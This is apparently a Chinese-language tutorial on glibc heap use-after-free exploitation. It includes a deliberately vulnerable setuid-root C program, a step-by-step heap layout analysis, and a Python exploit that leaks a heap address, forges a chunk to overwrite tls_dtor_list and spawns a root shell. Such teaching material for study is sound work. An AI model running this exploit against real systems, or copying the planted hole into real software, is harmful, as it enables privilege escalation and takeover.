## Use after free

​		UAF是使用一个已经被释放的堆内存，这可能导致任意代码执行。

<u>存在漏洞的代码：</u>

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#define BUFSIZE1 1020
#define BUFSIZE2 ((BUFSIZE1/2) - 4)

int main(int argc, char **argv) {

 char* name = malloc(12); /* [1] */
 char* details = malloc(12); /* [2] */
 strncpy(name, argv[1], 12-1); /* [3] */
 free(details); /* [4] */
 free(name);  /* [5] */
 printf("Welcome %s\n",name); /* [6] */
 fflush(stdout);

 char* tmp = (char *) malloc(12); /* [7] */
 char* p1 = (char *) malloc(BUFSIZE1); /* [8] */
 char* p2 = (char *) malloc(BUFSIZE1); /* [9] */
 free(p2); /* [10] */
 char* p2_1 = (char *) malloc(BUFSIZE2); /* [11] */
 char* p2_2 = (char *) malloc(BUFSIZE2); /* [12] */

 printf("Enter your region\n");
 fflush(stdout);
 read(0,p2,BUFSIZE1-1); /* [13] */
 printf("Region:%s\n",p2); 
 free(p1); /* [14] */
}
```

编译命令：

```shell
#echo 2 > /proc/sys/kernel/randomize_va_space
$gcc -o vuln vuln.c
$sudo chown root vuln
$sudo chgrp root vuln
$sudo chmod +s vuln
```

​		上述代码在第[6]行和[13]行存在UAF漏洞。它们各自的堆内存在[5]和[10]行中被释放，但他们的指针即使在[6]和[13]行中free之后仍被使用。第[6]行导致信息泄露，第[13]行的UAF导致任意代码执行。

​		在第[6]行中，泄露的是堆地址。这个泄露的堆地址将帮助攻击者轻松计算出随机堆段的基地址，从而绕过ASLR。

```
* 第[1]行为 name 分配16字节的堆内存地址。
* 第[2]行为 details 分配16字节的堆内存地址。
* 第[3]行将 argv[1] 复制到堆内存区域 name 。
* 第[4]和[5]行将堆内存区域 name 和 details 释放回 glibc malloc。
* 第[6]行的 printf 在释放后使用 name 指针，从而导致堆地址泄露。
```

​		由于 name 和 details 指针对应的块是 fast chunk，当这些 fast chunk 被释放时，它们会存储在 fast bin 中。每个 fast bin 包含一个空闲块的链表。因此，在本示例中，fast bin 的 index[0] 的单链表如下所示：

```
main_arena.fastbinsY[0] ---> 'name_chunk_address' ---> 'details_chunk_address' --> NULL
```

​		由于这种单一链接，name 的前4个字节包含 details_chunk 地址。因此，当 name 被打印时，details chunk 地址首先被打印。从堆布局可知， details chunk 位于堆基地址的偏移量 0x10 处。因此，`details_chunk - 0x10 = heap base address`。

​		现在已经获得了随机堆段的基地址，接下来实现任意代码执行。

```
* 第[7]行为 tmp 分配了16字节的堆内存区域。
* 第[8]行为 p1 分配了一个 1024 字节的堆内存区域。
* 第[9]行为 p2 分配了一个 1024 字节的堆内存区域。
* 第[10]行将堆内存区域 p2 释放回 glibc malloc。
* 第[11]行为 p2_1 分配了一个 512 字节的堆内存区域。
* 第[12]行为 p2_2 分配了一个 512 字节的堆内存区域。
* 第[13]行读取释放后的p2指针。
* 第[14]行将堆内存区域 p1 释放回 glibc malloc，这会导致程序退出时执行任意代码。
```

​		当 p2 释放到glibc malloc时，它会合并到top块中。稍后当为 p2_1 请求内存时，它是从top块分配的—— p2 和 p2_1 包含相同的堆地址。此外，当 p2_2 请求内存时，它也是从top块分配的—— p2_2 地址距离 p2 有512字节。因此，**当在第[13]行使用 free 后的 p2 指针时，攻击者控制的数据（最大1019字节）被复制到大小仅为512字节的 p2_1 中，因此剩余的数据会覆盖到下一个块 p2_2，从而允许攻击者覆盖下一个块头的 size 字段**。

​		如果攻击者可以成功覆盖下一个块 size 字段的 LSB，就可以欺骗 glibc malloc 取消链接块 p2_1，即使它处于已分配状态。当攻击者精心制作一个虚假的块头时， unlink 处于分配状态的大块可能会导致任意代码执行。攻击者构造的块头，如下所述：

```
* fd 应该指向释放的块地址。从堆布局中，可以发现 p2_1 位于偏移量 0x410。因此 fd = heap_base_addr + 0x410
* bk 应该指向释放的块地址。因此 fd = heap_base_addr + 0x410
* fd_nextsize 应该指向 tls_dtor_list – 0x14。 tls_dtor_list 属于 glibc 的私有匿名映射段，它是随机的。可以   使用爆破的方式绕过这种随机化
* bk_nextsize 应该指向包含 dtor_list 元素的堆地址。"system" dtor_list 是由攻击者在当前伪造的块头(p2_1)注入的，而 "setuid" dtor_list 是由攻击者注入到 p2_2 堆内存区域。从堆布局可知，"system"和"setuid" dtor_list 分别位于偏移量 0x428 和 0x618
```

<u>漏洞利用代码：</u>

```python
#exp.py
#!/usr/bin/env python
import struct
import sys
import telnetlib
import time

ip = '127.0.0.1'
port = 1234

def conv(num): return struct.pack("<I", num)

def send(data):
    global con
    con.write(data)
    return con.read_until('\n')

print "** Bruteforcing libc base address**"
libc_base_addr = 0x4176d000  # 0xb756a000
fd_nextsize = 0xb7fe96c0 # (libc_base_addr - 0x1000) + 0x6c0
system = 0x417b4970  # libc_base_addr + 0x47970 # 0x417b4970
system_arg = 0x80482ae
size = 0x200
setuid = 0x41830060       # libc_base_addr + 0xc3060  # 0x41830060
setuid_arg = 0x0

while True:
    try: 
        time.sleep(4)
        con = telnetlib.Telnet(ip, port)
        laddress = con.read_until('\n')
        laddress = laddress[8:12]
        heap_addr_tup = struct.unpack("<I", laddress)
        heap_addr = heap_addr_tup[0]
        print "** Leaked heap addresses : [0x%x] **" %(heap_addr)
        heap_base_addr = heap_addr - 0x10
        fd = heap_base_addr + 0x410
        bk = fd
        bk_nextsize = heap_base_addr + 0x618
        mp = heap_base_addr + 0x18
        nxt = heap_base_addr + 0x428

        print "** Constructing fake chunk to overwrite tls_dtor_list**"
        fake_chunk = conv(fd)
        fake_chunk += conv(bk)
        fake_chunk += conv(fd_nextsize)
        fake_chunk += conv(bk_nextsize)
        fake_chunk += conv(system)
        fake_chunk += conv(system_arg)
        fake_chunk += "A" * 484
        fake_chunk += conv(size)
        fake_chunk += conv(setuid)
        fake_chunk += conv(setuid_arg)
        fake_chunk += conv(mp)
        fake_chunk += conv(nxt)
        print "** Successful tls_dtor_list overwrite gives us shell!!**"
        send(fake_chunk)

        con.interact()
    except: 
        exit(0)
```















